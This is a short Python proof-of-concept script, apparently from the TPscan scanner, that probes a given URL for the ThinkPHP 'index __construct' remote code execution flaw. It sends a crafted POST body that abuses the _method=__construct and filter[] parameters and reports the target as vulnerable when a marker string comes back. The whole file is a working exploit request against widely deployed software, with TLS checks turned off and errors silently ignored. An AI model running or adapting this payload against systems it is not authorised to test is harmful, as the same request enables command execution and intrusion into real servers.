#!/usr/bin/env python
# coding=utf-8
import urllib
import requests
import urllib3
urllib3.disable_warnings()

def thinkphp_index_construct_rce_verify(url):
    pocdict = {
        "vulnname":"thinkphp_index_construct_rce",
        "isvul": False,
        "vulnurl":"",
        "payload":"",
        "proof":"",
        "response":"",
        "exception":"",
    }
    headers = {
        "User-Agent": 'TPscan',
        "Content-Type": "application/x-www-form-urlencoded",
    }
    payload = 's=4e5e5d7364f443e28fbf0d3ae744a59a&_method=__construct&method&filter[]=print_r'
    try:
        vurl = urllib.parse.urljoin(url, 'index.php?s=index/index/index')
        req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
        if r"4e5e5d7364f443e28fbf0d3ae744a59a" in req.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = vurl
            pocdict['payload'] = payload
            pocdict['proof'] = '4e5e5d7364f443e28fbf0d3ae744a59a'
            pocdict['response'] = req.text
            print(pocdict)

    except:
        pass

